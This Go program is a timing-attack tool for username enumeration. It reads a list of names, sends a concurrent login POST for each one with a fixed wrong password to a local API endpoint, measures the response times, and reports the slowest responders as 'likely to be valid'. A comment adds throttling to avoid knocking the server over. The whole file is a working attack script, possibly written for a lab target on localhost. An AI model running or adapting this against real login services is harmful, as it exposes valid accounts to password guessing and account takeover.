package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

var (
	usernameChan chan string
	resultsChan   chan result
)

type login struct {
	Username string `json:"username"`
	Password string `json:"password"`
}
type result struct {
	username string
	time     int64
}

func main() {
	//Read usernames into channel
	var usernameSlice []string
	var resultsSlice []result
	file, err := os.Open("names.txt")
	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() { //Build wordlist as a Slice (array)
		usernameSlice = append(usernameSlice, strings.TrimSuffix(scanner.Text(),"\n"))
	}
	bufSize := len(usernameSlice) //Determines how large we need to make the channels
	usernameChan = make(chan string, bufSize)
	resultsChan = make(chan result, bufSize)
	for i:=0;i<bufSize;i++ { //Send the work to each thread
		usernameChan <- usernameSlice[i]
		if i % 50 == 0 {time.Sleep(time.Millisecond*200)} //Back off every 50 requests, otherwise you *WILL* DoS the server
		go doAndtimeRequest(<- usernameChan)
	}
	fmt.Println("Work sent")
	for i:=0;i<bufSize;i++ { //Retrieve results from each thread
		var res result
		res = <- resultsChan
		resultsSlice = append(resultsSlice, res)
	}
	fmt.Println("Work completed")
	max := findMax(resultsSlice)
	//fmt.Println(max)
	findValid(resultsSlice,max)
}
func findValid(res []result, max int64) { //using the max time, find times within 10% of this and print unames
	threshold := 0.9 * float64(max)
	for _, val := range res {
		if float64(val.time) > threshold {
			fmt.Println(val.username, "is likely to be valid")
		}
	}
}

func findMax(res []result) int64 {
	max := int64(0)
	for _, val := range res {
		if val.time > max {
			max = val.time
		}
	}
	return max
}
func doAndtimeRequest(username string) {
	start := time.Now()
	doLoginPOST(username)
	end := time.Now()
	res := result{username: username, time: end.Sub(start).Nanoseconds()}
	resultsChan <- res
}
func doLoginPOST(username string) { //This performs the API POST request
	jsonStr, err := json.Marshal(login{Username: username, Password: "invalidPassword1"})
	if err != nil {
		fmt.Println(err.Error())
	}
	reader := strings.NewReader(string(jsonStr))
	resp, _ := http.Post("http://localhost:8081/api/user/login", "application/json", reader)
	resp.Body.Close()
}
